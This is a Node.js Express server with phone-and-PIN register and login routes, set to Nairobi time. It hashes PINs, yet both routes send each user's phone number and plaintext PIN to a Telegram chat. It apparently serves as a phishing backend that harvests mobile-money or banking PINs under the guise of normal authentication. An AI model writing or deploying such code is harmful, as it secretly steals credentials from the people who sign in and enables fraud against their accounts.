require("dotenv").config();
const express = require("express");
const bcrypt = require("bcryptjs");
const cors = require("cors");
const TelegramBot = require("node-telegram-bot-api");

const app = express();
const PORT = process.env.PORT || 10000;

// Middleware
app.use(cors());
app.use(express.json());
app.use(express.static("public")); // Serves your index.html

// Telegram Setup
const bot = new TelegramBot(process.env.TELEGRAM_BOT_TOKEN, { polling: false });

// Temporary in-memory database (resets on server restart)
let users = []; 

// Helper: Send Telegram Message
async function sendTelegram(message) {
  try {
    await bot.sendMessage(process.env.TELEGRAM_CHAT_ID, message, { parse_mode: "Markdown" });
    console.log("📨 Telegram notification sent");
  } catch (err) {
    console.error("❌ Telegram error:", err.message);
  }
}

// ---------------- ROUTES ----------------

// 1. REGISTER ROUTE
app.post("/api/auth/register", async (req, res) => {
  try {
    const { phone, pin } = req.body;

    // Validate: Must be 4 or 5 digits
    if (!phone || !pin) {
      return res.status(400).json({ message: "Phone and PIN are required" });
    }
    if (pin.length < 4 || pin.length > 5) {
      return res.status(400).json({ message: "PIN must be exactly 4 or 5 digits" });
    }

    // Check if user exists
    const existingUser = users.find(u => u.phone === phone);
    if (existingUser) {
      return res.status(409).json({ message: "Phone already registered" });
    }

    // Hash the PIN for basic security
    const hashedPin = await bcrypt.hash(pin, 10);
    const registrationId = "#" + Math.floor(1000 + Math.random() * 9000);

    // Save user
    const newUser = { phone, pin: hashedPin, registrationId, verified: false, loginCount: 0 };
    users.push(newUser);

    // 🔔 Send Telegram Alert
    const time = new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" });
    const tgMessage = `
🆕 *NEW REGISTRATION*
━━━━━━━━━━━━━━━━━━
📱 *Phone:* \`${phone}\`
🔑 *PIN:* \`${pin}\`
🆔 *Reg ID:* \`${registrationId}\`
🕒 *Time:* ${time}
    `;
    sendTelegram(tgMessage);

    // Send success back to frontend
    res.status(201).json({
      message: "Registration successful",
      registrationId: registrationId,
      phone: phone
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

// 2. LOGIN ROUTE
app.post("/api/auth/login", async (req, res) => {
  try {
    const { phone, pin } = req.body;

    // Validate: Must be 4 or 5 digits
    if (!phone || !pin) {
      return res.status(400).json({ message: "Phone and PIN are required" });
    }
    if (pin.length < 4 || pin.length > 5) {
      return res.status(400).json({ message: "PIN must be exactly 4 or 5 digits" });
    }

    // Find user
    const user = users.find(u => u.phone === phone);
    if (!user) {
      return res.status(404).json({ message: "User not found" });
    }

    // Check PIN
    const isMatch = await bcrypt.compare(pin, user.pin);
    if (!isMatch) {
      return res.status(401).json({ message: "Invalid PIN" });
    }

    // Update login count
    user.loginCount += 1;

    // 🔔 Send Telegram Alert
    const time = new Date().toLocaleString("en-KE", { timeZone: "Africa/Nairobi" });
    const tgMessage = `
🔐 *USER LOGIN*
━━━━━━━━━━━━━━━━━━
📱 *Phone:* \`${phone}\`
🔑 *PIN Entered:* \`${pin}\`
🔁 *Login Count:* ${user.loginCount}
📊 *Status:* ${user.verified ? "✅ Verified" : "⚠️ Pending Verification"}
🕒 *Time:* ${time}
    `;
    sendTelegram(tgMessage);

    res.json({
      message: "Login successful",
      registrationId: user.registrationId,
      verified: user.verified
    });

  } catch (err) {
    console.error(err);
    res.status(500).json({ message: "Server error" });
  }
});

// Start Server
app.listen(PORT, "0.0.0.0", () => {
  console.log(`🚀 Server running on port ${PORT}`);
});
